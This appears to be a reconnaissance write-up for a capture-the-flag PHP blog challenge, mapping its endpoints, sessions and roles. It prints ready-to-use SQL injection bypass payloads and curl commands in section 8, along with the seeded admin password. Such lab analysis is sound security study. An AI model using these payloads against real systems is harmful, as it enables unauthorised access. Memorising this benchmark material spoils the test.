# Reconnaissance Deliverable: PHP Blog Application (XBEN-039-24)

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the application's attack surface, with special emphasis on authorization and privilege escalation opportunities for the Authorization Analysis Specialist.

**Key Sections for Authorization Analysis:**
- **Section 4 (API Endpoint Inventory):** Contains authorization details for each endpoint - focus on "Required Role" and "Object ID Parameters" columns to identify IDOR candidates.
- **Section 6.4 (Guards Directory):** Catalog of authorization controls - understand what each guard means before analyzing vulnerabilities.
- **Section 7 (Role & Privilege Architecture):** Complete role hierarchy and privilege mapping - use this to understand the privilege lattice and identify escalation targets.
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized lists of endpoints for horizontal, vertical, and context-based authorization testing.

**How to Use the Network Mapping (Section 6):** The entity/flow mapping shows system boundaries and data sensitivity levels. Pay special attention to flows marked with authorization guards and entities handling PII/sensitive data.

**Priority Order for Testing:** Start with Section 8's High-priority horizontal candidates, then vertical escalation endpoints for each role level, finally context-based workflow bypasses.

## 1. Executive Summary

The target application is a deliberately vulnerable PHP 7.4 blog platform built on a classic LAMP stack (Linux, Apache, MySQL, PHP) deployed as a two-tier Docker containerized system. The application represents a Capture The Flag (CTF) security challenge with **critical security vulnerabilities** designed for educational penetration testing.

**Core Technology Stack:**
- **Frontend:** PHP 7.4 with inline HTML (no templating engine), vanilla JavaScript for form submission
- **Backend:** PHP 7.4 with Apache 2.4.54 (Debian), direct `mysqli` database interaction (no ORM)
- **Database:** MySQL 5.7 with three tables (posts, comments, admins)
- **Infrastructure:** Docker Compose orchestration, Apache web server, internal Docker bridge networking

**Primary User-Facing Components:**
1. **Public Blog Interface** (`/index.php`) - Displays published blog posts with category filtering (currently disabled)
2. **Admin Login Portal** (`/admin.php`) - Authentication endpoint for administrative access
3. **Static Assets** (`/styles.css`, `/images/*.jpg`) - CSS stylesheet and image files served by Apache

**Critical Security Posture:**
- **PHP 7.4** (End-of-Life since November 2022 - no security updates)
- **MySQL 5.7** (Extended support only - limited security patches)
- **MD5 Password Hashing** (Cryptographically broken since 2004)
- **SQL Injection Vulnerabilities** in authentication endpoint (critical authentication bypass)
- **No HTTPS/TLS** (All communications in plaintext)
- **No Input Validation** (Zero sanitization of user input)
- **Session Fixation Vulnerabilities** (No session regeneration after login)
- **Verbose Error Disclosure** (`display_errors = On` exposes database structure)

The attack surface consists of **2 primary PHP endpoints** with minimal authorization controls, making the application highly vulnerable to authentication bypass, privilege escalation, and data exfiltration attacks.

## 2. Technology & Service Map

### Frontend
- **Framework:** None - Raw PHP 7.4 with inline HTML/CSS
- **JavaScript:** Vanilla JS (minimal usage, only for form auto-submission)
- **Styling:** Single CSS file (`/styles.css`, 453 bytes)
- **Rendering:** Server-side PHP echo statements (no templating engine)
- **Authentication Library:** PHP native sessions (no third-party auth libraries)

### Backend
- **Language:** PHP 7.4.33 (End-of-Life, no security updates)
- **Framework:** None - Direct file-based routing, no MVC pattern
- **Web Server:** Apache 2.4.54 (Debian) with `mod_php`
- **Database Driver:** `mysqli` extension (no prepared statements used)
- **Key Dependencies:** 
  - PHP `mysqli` extension for database connectivity
  - Apache `mod_rewrite` enabled (though not used in this application)
  - PHP session handling for authentication state

### Infrastructure
- **Hosting:** Docker containerized deployment (local development environment)
- **CDN:** None
- **Database:** MySQL 5.7 (extended support, limited security patches)
- **Container Orchestration:** Docker Compose with two services:
  - `web` container (PHP 7.4-apache base image)
  - `db` container (MySQL 5.7)
- **Network:** Internal Docker bridge network (`172.x.x.x` subnet)
- **Port Exposure:** 
  - Port 39001 (HTTP) → web container port 80
  - Port 3306 (MySQL) → Internal only, not exposed to host

### Identified Subdomains
- **Finding:** No subdomains identified
- **Subfinder Results:** No DNS subdomains discovered (application runs on localhost)
- **Virtual Hosts:** Single Apache VirtualHost on port 80

### Open Ports & Services
From nmap scan analysis:

| Port | State | Service | Version | Purpose |
|------|-------|---------|---------|---------|
| 80/tcp | open | http | Caddy httpd | HTTP web server (note: nmap identified as Caddy, but actually Apache in container) |
| 39001/tcp | open | http | Apache 2.4.54 (Debian) | Target application HTTP endpoint |
| 3306/tcp | closed (external) | mysql | MySQL 5.7 | Database service (internal Docker network only) |

**Service Details:**
- **HTTP (Port 39001):** Mapped to container port 80, serves PHP application via Apache
- **MySQL (Port 3306):** Not exposed externally, accessible only within Docker network via hostname `db`
- **No HTTPS:** No SSL/TLS certificate, no port 443 listening

## 3. Authentication & Session Management Flow

### Entry Points
- **Primary Login:** `POST /admin.php` (username/password form submission)
- **Login Form Display:** `GET /admin.php` (shows HTML form)
- **No Registration:** No user registration endpoint exists
- **No Password Reset:** No password recovery mechanism
- **No SSO/OAuth:** No external identity provider integration

### Mechanism

**Step-by-Step Authentication Process:**

1. **User Navigates to Login Form**
   - **Request:** `GET /admin.php`
   - **File:** `/app/html/admin.php`, lines 34-59
   - **Action:** Apache serves login form HTML with username and password fields

2. **User Submits Credentials**
   - **Request:** `POST /admin.php` with parameters `username` and `password`
   - **File:** `/app/html/admin.php`, lines 11-31
   - **Processing:**
     - Line 17: `$username = $_POST['username'];` (no sanitization)
     - Line 18: `$password = MD5($_POST['password']);` (weak MD5 hashing)

3. **Database Credential Validation**
   - **File:** `/app/html/admin.php`, line 20
   - **Query:** `SELECT id FROM admins WHERE username = '$username' AND password = '$password'`
   - **Vulnerability:** Direct string concatenation (SQL injection vulnerability)
   - **Database Table:** `admins` (columns: id, username, password)
   - **Validation Logic:** If query returns exactly 1 row (`$result->num_rows == 1`), authentication succeeds

4. **Session Creation**
   - **File:** `/app/html/admin.php`, line 25
   - **Action:** `$_SESSION['admin_logged_in'] = true;`
   - **Session Initialization:** `session_start()` at line 2
   - **Session ID:** PHP generates PHPSESSID cookie (32 hex characters)
   - **Storage:** Server-side session files in `/tmp/sess_[SESSION_ID]`

5. **Cookie Setting**
   - **Cookie Name:** `PHPSESSID` (PHP default)
   - **Cookie Value:** Random 32-character session ID
   - **Cookie Attributes:**
     - `HttpOnly`: ❌ **NOT SET** (JavaScript can access cookie)
     - `Secure`: ❌ **NOT SET** (sent over HTTP, not HTTPS-only)
     - `SameSite`: ❌ **NOT SET** (vulnerable to CSRF)
     - `Path`: `/` (default)
     - `Lifetime`: 0 (session cookie, expires on browser close)

6. **Flag Display**
   - **File:** `/app/html/admin.php`, line 26 (after login) or line 6 (if already logged in)
   - **Action:** `echo "@FLAG@";` (flag placeholder replaced at build time)
   - **Session Check:** Lines 5-8 verify `$_SESSION['admin_logged_in'] === true`

### Code Pointers

**Primary Authentication Handler:**
```php
// File: /app/html/admin.php

// Line 2: Session initialization
session_start();

// Lines 5-8: Check existing session
if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
    echo "@FLAG@";
    exit;
}

// Lines 11-31: POST request handler
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Lines 12-15: Database connection
    $conn = new mysqli('db', 'user', 'password', 'blogDB');
    
    // Lines 17-18: Credential processing (VULNERABLE)
    $username = $_POST['username'];
    $password = MD5($_POST['password']);
    
    // Lines 20-21: SQL query (SQL INJECTION VULNERABILITY)
    $sql = "SELECT id FROM admins WHERE username = '$username' AND password = '$password'";
    $result = $conn->query($sql);
    
    // Lines 23-29: Authentication result handling
    if ($result->num_rows == 1) {
        $_SESSION['admin_logged_in'] = true;
        echo "@FLAG@";
    } else {
        $errorMessage = 'Invalid username or password.';
    }
}
```

**Database Schema:**
```sql
-- File: /app/db_init.sql, lines 27-31, 57
CREATE TABLE admins (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL
);

INSERT INTO admins (username, password) VALUES ('admin', MD5('ONEverySecurePassword123!'));
```

### 3.1 Role Assignment Process

**Role Determination:** 
- **Method:** Binary boolean flag in session variable
- **Implementation:** `$_SESSION['admin_logged_in']` set to `true` or not set at all
- **Database Lookup:** None - roles not stored in database, purely session-based
- **External Service:** None - no external identity provider
- **Code Location:** `/app/html/admin.php`, line 25

**Default Role:**
- **New Users:** N/A (no user registration exists)
- **Anonymous Visitors:** No role (no session variable set)
- **After Login:** `admin` role (implicitly represented by `admin_logged_in = true`)

**Role Upgrade Path:**
- **Finding:** No role upgrade mechanism exists
- **Reason:** Application has only two states: anonymous or admin (no intermediate roles)
- **Admin Approval:** N/A (no multi-user system)
- **Self-Service:** N/A
- **Automatic Upgrade:** N/A

**Code Implementation:**
```php
// File: /app/html/admin.php, line 25
$_SESSION['admin_logged_in'] = true;  // Only role assignment in entire application
```

### 3.2 Privilege Storage & Validation

**Storage Location:**
- **Primary Storage:** PHP session data in file system
- **File Path:** `/tmp/sess_[SESSION_ID]` (inside web container)
- **File Format:** Serialized PHP data: `admin_logged_in|b:1;`
- **JWT Claims:** ❌ Not used (no JWT implementation)
- **Database:** ❌ Not stored in database (no user_roles table or column)
- **External Service:** ❌ Not used

**Validation Points:**
- **Single Check Location:** `/app/html/admin.php`, lines 5-8
- **No Middleware:** No centralized authorization middleware
- **No Decorators:** No function/class-level authorization decorators
- **Inline Check Only:** Single `if` statement checking session variable

**Validation Implementation:**
```php
// File: /app/html/admin.php, lines 5-8
if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
    echo "@FLAG@";
    exit;
}
```

**Cache/Session Persistence:**
- **Session Lifetime:** Until browser closes (session cookie with lifetime=0)
- **Server-Side Timeout:** 24 minutes (PHP default `gc_maxlifetime`)
- **Refresh Mechanism:** None - session data persists until garbage collection
- **Regeneration:** ❌ **NOT IMPLEMENTED** (vulnerable to session fixation)

**Code Pointers:**
- **Session Initialization:** `/app/html/admin.php`, line 2 (`session_start()`)
- **Session Storage:** `/app/html/admin.php`, line 25 (`$_SESSION['admin_logged_in'] = true`)
- **Session Validation:** `/app/html/admin.php`, lines 5-8

### 3.3 Role Switching & Impersonation

**Impersonation Features:** 
- **Finding:** ❌ None - no impersonation functionality exists
- **Admin-to-User:** Not implemented
- **User-to-User:** N/A (no multi-user system)

**Role Switching:**
- **Finding:** ❌ None - no temporary privilege elevation mechanisms
- **Sudo Mode:** Not implemented
- **Step-Up Authentication:** Not implemented

**Audit Trail:**
- **Role Switches:** N/A (feature doesn't exist)
- **Impersonation Logging:** N/A (feature doesn't exist)
- **General Logging:** ❌ No application-level logging implemented
- **Apache Access Logs:** Basic request logging only (no authentication event details)

**Code Implementation:**
- **Result:** No code exists for role switching or impersonation
- **Session Variables:** Only `$_SESSION['admin_logged_in']` exists (single-purpose boolean)

## 4. API Endpoint Inventory

**Network Surface Focus:** Only network-accessible API endpoints reachable through the target web application (http://localhost:39001). Local-only utilities, build tools, and development endpoints are excluded.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|-------------------------|----------------------------|
| GET | `/` | anon | None | None | Blog home page redirect. Apache DirectoryIndex routes to `/index.php`. |
| GET | `/index.php` | anon | None | None | Displays published blog posts. Query: `SELECT * FROM posts WHERE published = 1`. See `/app/html/index.php:40-48`. |
| GET | `/index.php?category={cat}` | anon | None | None | **DISABLED FEATURE** - Category filter hardcoded to empty string at line 38. Would filter posts by category if enabled. **SQL injection vulnerability** at line 46 (currently unreachable). |
| GET | `/admin.php` | anon | None | None (public form) | Displays admin login form HTML. No authentication required to view form. See `/app/html/admin.php:34-59`. |
| POST | `/admin.php` | anon → admin | None | SQL query validation + session flag | **Authentication endpoint**. Accepts `username` and `password` POST parameters. **SQL injection vulnerability** at line 20. Sets `$_SESSION['admin_logged_in'] = true` on success. See `/app/html/admin.php:11-31`. |
| GET | `/admin.php` (authenticated) | admin | None | Session check: `$_SESSION['admin_logged_in'] === true` | Returns flag if session variable is set. Early return at lines 5-8 bypasses login form. See `/app/html/admin.php:5-8`. |
| GET | `/styles.css` | anon | None | None (static file) | Static CSS stylesheet. Served directly by Apache (no PHP processing). File size: 453 bytes. |
| GET | `/images/morning-dew.jpg` | anon | None | None (static file) | Static image file. Served directly by Apache. File size: 273,568 bytes (WebP format). |
| GET | `/images/sunset.jpg` | anon | None | None (static file) | Static image file. Served directly by Apache. File size: 226,098 bytes (WebP format). |
| GET | `/images/{filename}` | anon | None | None (static directory) | Directory listing enabled via Apache `Options Indexes`. Missing images return 404. |

**Key Authorization Observations:**

1. **Single Authorization Check:** Only `/admin.php` (when authenticated) has an authorization check. All other endpoints are publicly accessible.

2. **No Object-Level Authorization:** No endpoints accept object ID parameters (no `/api/posts/{id}`, `/api/users/{id}`, etc.). The application has no CRUD operations exposed via HTTP parameters.

3. **Session-Only Security:** Authorization relies solely on PHP session variable `$_SESSION['admin_logged_in']`. No role-based access control (RBAC), no capability checks, no resource-level permissions.

4. **SQL Injection = Authentication Bypass:** The POST `/admin.php` endpoint has a critical SQL injection vulnerability that allows complete authentication bypass without valid credentials.

5. **No Rate Limiting:** No brute force protection on authentication endpoint. Unlimited login attempts permitted.

6. **Disabled Feature Risk:** The category filter functionality exists in code but is disabled. If re-enabled, it would introduce an exploitable SQL injection vulnerability.

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** Only input vectors accessible through the target web application's network interface (http://localhost:39001). Inputs from local-only scripts, build tools, development utilities, or non-network-accessible components are excluded.

### URL Parameters (GET)

1. **`category` parameter** (DISABLED)
   - **Endpoint:** `/index.php?category={value}`
   - **Status:** Currently disabled (hardcoded to empty string at `/app/html/index.php:38`)
   - **Code Location:** `/app/html/index.php:37-38`
   - **If Enabled:** Would flow to SQL query at line 46 (SQL injection vulnerability)
   - **Sanitization:** None
   - **Expected Type:** String (category name)
   - **Vulnerable Code (disabled):**
     ```php
     // Line 37: Commented out
     #$category = isset($_GET['category']) ? $_GET['category'] : '';
     
     // Line 38: Hardcoded override
     $category = ""; #disable feature for this challenge
     
     // Line 46: Would be vulnerable if enabled
     if (!empty($category)) {
         $sql .= "and category = '" . $category . "' ";
     }
     ```

### POST Body Fields (Form Data)

1. **`username` parameter** (CRITICAL VULNERABILITY)
   - **Endpoint:** `POST /admin.php`
   - **Code Location:** `/app/html/admin.php:17`
   - **Data Flow:** `$_POST['username']` → `$username` → SQL query (line 20)
   - **Sanitization:** ❌ None
   - **Expected Type:** String (admin username)
   - **Dangerous Sink:** SQL query string concatenation
   - **Vulnerability:** SQL Injection (authentication bypass)
   - **Code:**
     ```php
     // Line 17: Direct assignment, no validation
     $username = $_POST['username'];
     
     // Line 20: String concatenation into SQL query
     $sql = "SELECT id FROM admins WHERE username = '$username' AND password = '$password'";
     ```

2. **`password` parameter** (PARTIAL VULNERABILITY)
   - **Endpoint:** `POST /admin.php`
   - **Code Location:** `/app/html/admin.php:18`
   - **Data Flow:** `$_POST['password']` → `MD5()` → `$password` → SQL query (line 20)
   - **Sanitization:** Partial (MD5 hash produces 32 hex characters, limiting injection)
   - **Expected Type:** String (admin password)
   - **Dangerous Sink:** SQL query string concatenation
   - **Vulnerability:** Weak cryptographic hashing (MD5 is broken), theoretical SQL injection (limited by MD5 output format)
   - **Code:**
     ```php
     // Line 18: MD5 hash applied (still vulnerable to cryptographic attacks)
     $password = MD5($_POST['password']);
     
     // Line 20: String concatenation into SQL query
     $sql = "SELECT id FROM admins WHERE username = '$username' AND password = '$password'";
     ```

### HTTP Headers

**Finding:** No user-controlled HTTP headers are processed by the application.

- **`$_SERVER['REQUEST_METHOD']`:** Used to detect POST requests (line 11 of `/app/html/admin.php`)
  - **Usage:** `if ($_SERVER["REQUEST_METHOD"] == "POST")`
  - **Security:** Safe - used for control flow only, not in queries or output
  
- **`User-Agent`, `Referer`, `X-Forwarded-For`, etc.:** Not accessed or processed by the application

- **Custom Headers:** No custom headers processed

### Cookie Values

**Session Cookie Only:**

1. **`PHPSESSID` cookie**
   - **Purpose:** PHP session identifier
   - **Controlled By:** PHP session management (not directly user-controllable)
   - **Security Flags:** 
     - `HttpOnly`: ❌ Not set (vulnerable to XSS-based theft)
     - `Secure`: ❌ Not set (sent over HTTP)
     - `SameSite`: ❌ Not set (vulnerable to CSRF)
   - **Validation:** Used by `session_start()` to load session data
   - **Attack Vector:** Session fixation, session hijacking

**No Other Cookies:** Application does not read or process any other cookies.

### Input Vectors Summary Table

| Input Type | Parameter Name | Endpoint | File:Line | Flows To | Sanitization | Vulnerability |
|------------|----------------|----------|-----------|----------|--------------|---------------|
| POST | `username` | /admin.php | admin.php:17 | SQL query (line 20) | None | **SQL Injection** |
| POST | `password` | /admin.php | admin.php:18 | SQL query (line 20) | MD5 hash | **Weak Crypto** |
| GET | `category` | /index.php | index.php:37 | SQL query (line 46) | None | **SQL Injection (disabled)** |
| COOKIE | `PHPSESSID` | /admin.php | admin.php:2 | Session loading | PHP internal | **Session Fixation** |
| SERVER | `REQUEST_METHOD` | /admin.php | admin.php:11 | Control flow | N/A | None (safe) |

## 6. Network & Interaction Map

**Network Surface Focus:** Only components part of the deployed, network-accessible infrastructure. Local development environments, build CI systems, local-only tools, and non-network-accessible components are excluded.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| ExternalUser | ExternAsset | Internet | Browser | None | Anonymous users accessing public blog |
| AdminUser | ExternAsset | Internet | Browser | Credentials | Administrator accessing login portal |
| WebContainer | Service | App | PHP 7.4/Apache 2.4 | PII, Tokens, Secrets | Main application backend, processes HTTP requests |
| MySQLDatabase | DataStore | Data | MySQL 5.7 | PII, Tokens, Secrets | Stores admin credentials, blog posts, flag |
| DockerBridge | Network | Edge | Docker Networking | N/A | Internal container network, not exposed externally |
| StaticFiles | DataStore | App | Apache File System | Public | CSS, images served directly by Apache |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| ExternalUser | Access: `http://localhost:39001/`; Privileges: `anonymous`; Can Access: `index.php, styles.css, images/*` |
| AdminUser | Access: `http://localhost:39001/admin.php`; Privileges: `admin` (post-auth); Credentials: `admin / ONEverySecurePassword123!` (MD5 hashed) |
| WebContainer | Hosts: `http://localhost:39001 (mapped to container :80)`; Endpoints: `/index.php, /admin.php, /styles.css, /images/*`; Auth: Session-based (`$_SESSION['admin_logged_in']`); Dependencies: `MySQLDatabase`; PHP Version: `7.4.33 (EOL)`; Apache Version: `2.4.54 (Debian)` |
| MySQLDatabase | Engine: `MySQL 5.7`; Exposure: `Internal Docker network only (host: db, port: 3306)`; Consumers: `WebContainer`; Credentials: `user:password (hardcoded in PHP files)`; Root Password: `rootpassword`; Tables: `admins, posts, comments`; Flag Storage: `posts table (published=0, category=Secret)` |
| DockerBridge | Network: `172.x.x.x subnet (auto-assigned)`; Isolation: `Container-to-container only`; External Access: `None (port 3306 not exposed to host)` |
| StaticFiles | Path: `/var/www/html/`; Files: `styles.css, images/morning-dew.jpg, images/sunset.jpg`; Served By: `Apache (no PHP processing)`; Directory Listing: `Enabled (Options Indexes)` |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| ExternalUser → WebContainer | HTTPS | `:39001 /index.php` | None | Public |
| ExternalUser → WebContainer | HTTP | `:39001 /styles.css` | None | Public |
| ExternalUser → WebContainer | HTTP | `:39001 /images/*` | None | Public |
| AdminUser → WebContainer | HTTP | `:39001 /admin.php (GET)` | None | Public |
| AdminUser → WebContainer | HTTP | `:39001 /admin.php (POST)` | auth:credentials | PII (credentials), Secrets (flag) |
| WebContainer → MySQLDatabase | TCP | `db:3306 (MySQL protocol)` | vpc-only, no-encryption | PII, Tokens, Secrets |
| WebContainer → ExternalUser | HTTP | `Response from :39001` | None | Public (or PII if authenticated) |
| WebContainer → StaticFiles | File System | `/var/www/html/*` | None | Public |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| None | Auth | No authentication required - publicly accessible endpoint |
| auth:credentials | Auth | Requires valid admin username and password submitted via POST form to `/admin.php`. Validated against `admins` table in MySQL database. **Vulnerable to SQL injection bypass.** |
| auth:session | Auth | Requires valid PHP session with `$_SESSION['admin_logged_in'] === true`. Session created after successful authentication. **Vulnerable to session fixation.** |
| vpc-only | Network | Communication restricted to Docker bridge network. Database host `db` is not exposed to host machine (port 3306 internal only). |
| no-encryption | Protocol | Database connections do not use SSL/TLS. All queries and data transmitted in plaintext within Docker network. **Vulnerable to container-to-container sniffing.** |
| http-only | Protocol | All web traffic uses HTTP without TLS encryption. **Vulnerable to network interception, credentials sent in plaintext.** |
| no-rate-limit | RateLimit | No rate limiting or brute force protection on authentication endpoint. Unlimited login attempts permitted. |
| directory-listing | Authorization | Apache `Options Indexes` enabled. Directories without index files display file listings. |
| sql-concat | Vulnerability | SQL queries use string concatenation instead of prepared statements. **Critical SQL injection vulnerability.** |

## 7. Role & Privilege Architecture

### 7.1 Discovered Roles

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|----------------|--------------|---------------------|
| anon | 0 | Global | No authentication required. No session variable set. Default state for all visitors. |
| admin | 1 | Global | Authenticated administrator. Session variable `$_SESSION['admin_logged_in'] = true` set after successful login. See `/app/html/admin.php:25`. |

**Key Observations:**
- **Binary Role System:** Only two roles exist (anonymous and admin)
- **No Intermediate Roles:** No "user," "moderator," "editor," or other intermediate privilege levels
- **Global Scope:** Roles apply application-wide, no organization/tenant/project-level roles
- **Session-Based Storage:** Roles stored in PHP session, not in database tables

### 7.2 Privilege Lattice

```
Privilege Ordering (→ means "can access resources of"):
anon (Level 0) → admin (Level 1)

Privilege Hierarchy:
┌──────────────────────────────────────┐
│  admin (Privilege Level: 1)          │
│  - View flag                         │
│  - Access /admin.php (authenticated) │
│  - All anon privileges               │
└──────────────┬───────────────────────┘
               │ dominates
               ↓
┌──────────────────────────────────────┐
│  anon (Privilege Level: 0)           │
│  - View published blog posts         │
│  - Access public pages               │
│  - View login form                   │
└──────────────────────────────────────┘

Parallel Isolation: NONE
(No roles exist at the same privilege level with isolated scopes)
```

**Role Switching Mechanisms:**
- **Impersonation:** ❌ Not implemented
- **Sudo Mode:** ❌ Not implemented
- **Role Delegation:** ❌ Not implemented
- **Temporary Elevation:** ❌ Not implemented

**Note:** The only way to change roles is through authentication (anon → admin) or session destruction (admin → anon). No lateral movement between equivalent roles exists because only one admin role exists.

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|---------------------------|----------------------|
| anon | `/index.php` | `/`, `/index.php`, `/admin.php` (GET - login form), `/styles.css`, `/images/*` | None (default state) |
| admin | `/admin.php` (flag display) | `/admin.php` (authenticated state - displays flag), all anon routes | Session-based (requires `$_SESSION['admin_logged_in'] = true`) |

**Landing Page Behavior:**

1. **Anonymous Users:**
   - Navigate to `http://localhost:39001/` → Apache serves `/index.php`
   - See published blog posts
   - Can click "Admin Login" link to reach `/admin.php` (shows login form)

2. **Admin Users (Post-Authentication):**
   - Navigate to `/admin.php` → Session check at lines 5-8 succeeds
   - Immediately see flag output (no login form displayed)
   - Can access all public pages (no restrictions on admin accessing public content)

**Route Access Matrix:**

| Route | anon | admin |
|-------|------|-------|
| `/` or `/index.php` | ✅ Yes | ✅ Yes |
| `/admin.php` (GET, not authenticated) | ✅ Yes (shows login form) | ✅ Yes (shows flag, bypasses form) |
| `/admin.php` (POST, authentication attempt) | ✅ Yes | ✅ Yes (but immediately redirected to flag display) |
| `/admin.php` (authenticated state) | ❌ No (must authenticate first) | ✅ Yes (flag displayed) |
| `/styles.css` | ✅ Yes | ✅ Yes |
| `/images/*` | ✅ Yes | ✅ Yes |

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|-------------------|-------------------|------------------|
| anon | None | No checks (default allow) | No storage (absence of session data) |
| admin | None (no middleware exists) | Inline check at `/app/html/admin.php:5-8`: `if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true)` | PHP session file: `/tmp/sess_[SESSION_ID]` containing `admin_logged_in\|b:1;` |

**Detailed Code Mapping:**

**Role: admin**

1. **Session Initialization:**
   ```php
   // File: /app/html/admin.php, Line 2
   session_start();
   ```

2. **Permission Check:**
   ```php
   // File: /app/html/admin.php, Lines 5-8
   if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
       echo "@FLAG@";  // Admin-only action
       exit;
   }
   ```

3. **Role Assignment:**
   ```php
   // File: /app/html/admin.php, Line 25
   $_SESSION['admin_logged_in'] = true;  // Set after successful authentication
   ```

4. **Storage Format:**
   - **File:** `/tmp/sess_[32_hex_character_session_id]`
   - **Content:** `admin_logged_in|b:1;` (PHP serialized format)
   - **Example:** `/tmp/sess_a1b2c3d4e5f6789...` contains the boolean flag

**Role: anon**
- **No Code Mapping:** Anonymous role is the default state (absence of admin session)
- **No Storage:** No session data exists for anonymous users (or session exists but without `admin_logged_in` variable)

## 8. Authorization Vulnerability Candidates

### 8.1 Horizontal Privilege Escalation Candidates

**Finding: NOT APPLICABLE - No horizontal privilege escalation opportunities exist**

**Rationale:**
- **No User-Owned Resources:** Application has no concept of user ownership
- **No Object IDs in URLs:** No endpoints accept object identifiers (no `/posts/{id}`, `/users/{id}`, etc.)
- **No Multi-User System:** Only one admin account exists; no "other users" to escalate against
- **Single-Tenant Architecture:** All data is globally accessible (no tenant isolation)

**Database Schema Analysis:**
- **posts table:** No `user_id`, `owner_id`, or `author_id` column (lines 7-15 of `/app/db_init.sql`)
- **comments table:** No `user_id` or `owner_id` column (lines 18-24 of `/app/db_init.sql`)
- **admins table:** Only one admin account (line 57 of `/app/db_init.sql`)

**Conclusion:** Horizontal privilege escalation (accessing another user's resources) is not possible because:
1. No resources are owned by specific users
2. No endpoints accept object identifiers that could be manipulated
3. Only one administrator exists in the system

**Theoretical Risk (if features were added):**
If the application were extended with user registration and user-owned posts/comments, it would be **highly vulnerable** to IDOR (Insecure Direct Object Reference) attacks due to the complete lack of authorization checks.

### 8.2 Vertical Privilege Escalation Candidates

Ranked list of endpoints that allow privilege escalation from anonymous user to administrator.

| Priority | Endpoint Pattern | Functionality | Risk Level | Exploitation Method |
|----------|-----------------|---------------|------------|---------------------|
| **CRITICAL** | `POST /admin.php` | Admin authentication | **CRITICAL** | SQL injection in `username` parameter bypasses authentication. Payload: `username=' OR '1'='1' --&password=x`. See `/app/html/admin.php:20`. Sets `$_SESSION['admin_logged_in'] = true` without valid credentials. |
| **HIGH** | `GET /index.php?category=` | Blog post filtering (disabled) | **HIGH** | If category filter is re-enabled (currently disabled at line 38), SQL injection at line 46 allows bypassing `published = 1` filter to access secret posts. Payload: `category=' OR published=0 OR '1'='1`. Contains flag in unpublished post. |
| **MEDIUM** | `POST /admin.php` | Admin authentication | **MEDIUM** | Session fixation attack. Attacker sets victim's `PHPSESSID` cookie before authentication, then uses same session after victim logs in. No `session_regenerate_id()` called after login (should be at line 25). |
| **MEDIUM** | `POST /admin.php` | Admin authentication | **MEDIUM** | Weak password hashing (MD5). If attacker obtains database access, admin password hash can be cracked. Password: `ONEverySecurePassword123!` is MD5 hashed. See `/app/html/admin.php:18` and `/app/db_init.sql:57`. |
| **LOW** | `POST /admin.php` | Admin authentication | **LOW** | Brute force attack. No rate limiting or account lockout. Can attempt unlimited login combinations. Generic error message prevents username enumeration. |

**Detailed Exploitation Paths:**

#### **CRITICAL: SQL Injection Authentication Bypass**

**File:** `/app/html/admin.php`, Line 20

**Vulnerable Code:**
```php
$username = $_POST['username'];  // Line 17: No sanitization
$password = MD5($_POST['password']);  // Line 18: MD5 hash
$sql = "SELECT id FROM admins WHERE username = '$username' AND password = '$password'";  // Line 20: SQL injection
```

**Exploitation:**
```bash
curl -X POST http://localhost:39001/admin.php \
  -d "username=admin' OR '1'='1' --&password=anything"
```

**Result:**
- Query becomes: `SELECT id FROM admins WHERE username='admin' OR '1'='1' --' AND password='...'`
- Comment (`--`) ignores password check
- Query returns rows (always true condition)
- `$result->num_rows == 1` check passes
- Line 25: `$_SESSION['admin_logged_in'] = true;`
- Line 26: Flag displayed
- **Privilege escalation: anon → admin**

#### **HIGH: Category Filter SQL Injection (Currently Disabled)**

**File:** `/app/html/index.php`, Lines 37-48

**Vulnerable Code:**
```php
#$category = isset($_GET['category']) ? $_GET['category'] : '';  // Line 37: Commented out
$category = ""; #disable feature for this challenge  // Line 38: Hardcoded to empty

if ($category == "Secret")  // Lines 42-43: Weak filter
    $category = "";

if (!empty($category)) {  // Line 45
    $sql .= "and category = '" . $category . "' ";  // Line 46: SQL injection
}
```

**Exploitation (if feature enabled):**
```bash
curl "http://localhost:39001/index.php?category=' OR published=0 OR category='"
```

**Result:**
- Query becomes: `SELECT * FROM posts WHERE published = 1 and category = '' OR published=0 OR category='' ORDER BY created_at DESC`
- Boolean logic allows `published=0` posts to be included
- Secret post displayed: `title='SECRET POST', content='<FLAG>@FLAG@</FLAG>', published=0`
- **Data exfiltration: Access to unpublished admin-only content**

### 8.3 Context-Based Authorization Candidates

**Finding: NO CONTEXT-BASED AUTHORIZATION VULNERABILITIES**

**Multi-Step Workflows Analysis:**
- **No Multi-Step Forms:** Application has no wizards or multi-step processes
- **No Workflow State:** No endpoints assume prior steps were completed
- **No Checkout Flows:** No e-commerce or payment workflows
- **No Onboarding:** No user registration or setup processes
- **No Password Reset:** No password recovery workflow

**Conclusion:** Application has only two simple workflows:
1. **Blog Viewing:** Single-step GET request to `/index.php` (no authorization required)
2. **Admin Login:** Single-step POST to `/admin.php` (authentication, not multi-step)

No opportunities for skipping workflow steps or bypassing contextual authorization checks exist.

## 9. Injection Sources (Command Injection and SQL Injection)

**Network Surface Focus:** Only injection sources reachable through the target web application's network interface (http://localhost:39001). Sources from local-only scripts, build tools, CLI applications, development utilities, or non-network-accessible components are excluded.

### Command Injection Sources

**Finding: NO COMMAND INJECTION VULNERABILITIES EXIST**

